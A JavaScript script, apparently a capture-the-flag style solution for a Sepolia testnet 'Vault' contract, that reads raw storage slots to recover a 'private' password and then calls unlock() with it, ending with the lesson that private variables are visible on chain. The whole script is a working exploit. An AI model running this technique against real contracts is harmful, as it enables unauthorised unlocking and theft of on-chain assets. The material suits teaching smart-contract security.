  import { createPublicClient, http, keccak256, encodePacked, toHex, pad } from 'viem';
  import { sepolia } from 'viem/chains';

const VAULT_ADDRESS = process.env.Vault_ADDRESS
const RPC_URL = process.env.sepolia_rpc
const PRIVATE_KEY = process.env.PRIVATE_KEY

const client = createPublicClient({
    chain: sepolia,
    transport: http(RPC_URL),
});

class StorageReader {
    constructor(VAULT_ADDRESS) {
        this.address = VAULT_ADDRESS;
    }

    // 读取简单的 slot
    async readSlot(slot) {
        const value = await client.getStorageAt({
            address: this.address,
            slot: toHex(slot, { size: 32 })
        });
        return value;
    }

    // 读取 uint256
    async readUint256(slot) {
        const value = await this.readSlot(slot);
        return BigInt(value);
    }

    // 读取 address（前 20 bytes）
    async readAddress(slot) {
        const value = await this.readSlot(slot);
        return '0x' + value.slice(-40);  // 取后 20 bytes
    }

    // 读取 mapping(address => uint256)
    async readMapping(baseSlot, key) {
        const slot = keccak256(
            encodePacked(
                ['address', 'uint256'],
                [key, BigInt(baseSlot)]
            )
        );
        return await this.readUint256(slot);
    }

    // 读取 mapping(uint256 => uint256)
    async readMappingUint(baseSlot, key) {
        const slot = keccak256(
            encodePacked(
                ['uint256', 'uint256'],
                [BigInt(key), BigInt(baseSlot)]
            )
        );
        return await this.readUint256(slot);
    }

    // 读取动态数组长度
    async readArrayLength(baseSlot) {
        return await this.readUint256(baseSlot);
    }

    // 读取动态数组元素
    async readArrayElement(baseSlot, index) {
        const arrayStartSlot = keccak256(
            encodePacked(['uint256'], [BigInt(baseSlot)])
        );
        const elementSlot = BigInt(arrayStartSlot) + BigInt(index);
        return await this.readUint256(elementSlot);
    }

    // 读取嵌套 mapping(address => mapping(uint256 => uint256))
    async readNestedMapping(baseSlot, key1, key2) {
        // 第一层
        const innerBase = keccak256(
            encodePacked(['address', 'uint256'], [key1, BigInt(baseSlot)])
        );
        // 第二层
        const finalSlot = keccak256(
            encodePacked(['uint256', 'bytes32'], [BigInt(key2), innerBase])
        );
        return await this.readUint256(finalSlot);
    }

    // 批量读取 slots
    async readSlots(startSlot, count) {
        const results = {};
        for (let i = 0; i < count; i++) {
            const slot = startSlot + i;
            results[slot] = await this.readSlot(slot);
            console.log(`Slot ${slot}:`, results[slot]);
        }
        return results;
    }
}

// 使用示例
async function main() {
    const contractAddress = VAULT_ADDRESS;
    const reader = new StorageReader(contractAddress);

    console.log('=== Reading Contract Storage ===\n');

    // 读取前 10 个 slots
    console.log('Basic slots:');
    await reader.readSlots(0, 10);

    console.log('\n=== Parsing Storage ===\n');

    // Slot 0: bool public locked
    const locked = await reader.readSlot(0);
    const isLocked = BigInt(locked) === 1n;
    console.log('Locked:', isLocked);

    // Slot 1: bytes32 private password
    const passwordBytes = await reader.readSlot(1);
    console.log('Password (hex):', passwordBytes);

    // 解码为 ASCII 字符串
    const passwordStr = Buffer.from(passwordBytes.slice(2), 'hex')
        .toString('utf8')
        .replace(/\0/g, ''); // 移除 null bytes 
    console.log('Password (string):', passwordStr);

    console.log('\n=== Unlocking Vault ===\n');

    // 调用 unlock(bytes32 password)
    const { createWalletClient } = await import('viem');
    const { privateKeyToAccount } = await import('viem/accounts');

    const account = privateKeyToAccount(PRIVATE_KEY);
    const walletClient = createWalletClient({
        account,
        chain: sepolia,
        transport: http(RPC_URL),
    });

    const unlockAbi = [
        {
            "inputs": [{"internalType": "bytes32", "name": "_password", "type": "bytes32"}],
            "name": "unlock",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

    console.log('Calling unlock() with password:', passwordBytes);
    const tx = await walletClient.writeContract({
        address: VAULT_ADDRESS,
        abi: unlockAbi,
        functionName: 'unlock',
        args: [passwordBytes]
    });

    console.log('Transaction hash:', tx);

    // 等待确认
    const receipt = await client.waitForTransactionReceipt({ hash: tx });
    console.log('Transaction status:', receipt.status === 'success' ? '✓ Success' : '✗ Failed');

    // 验证是否已解锁
    console.log('\n=== Verification ===\n');
    const lockedAfter = await reader.readSlot(0);
    const isLockedAfter = BigInt(lockedAfter) === 1n;
    console.log('Locked after attack:', isLockedAfter);

    if (!isLockedAfter) {
        console.log('\n✓✓✓ Vault unlocked successfully!');
        console.log('Lesson: "private" variables are NOT private on blockchain!');
    } else {
        console.log('\n✗ Unlock failed');
    }
}

main().catch(console.error);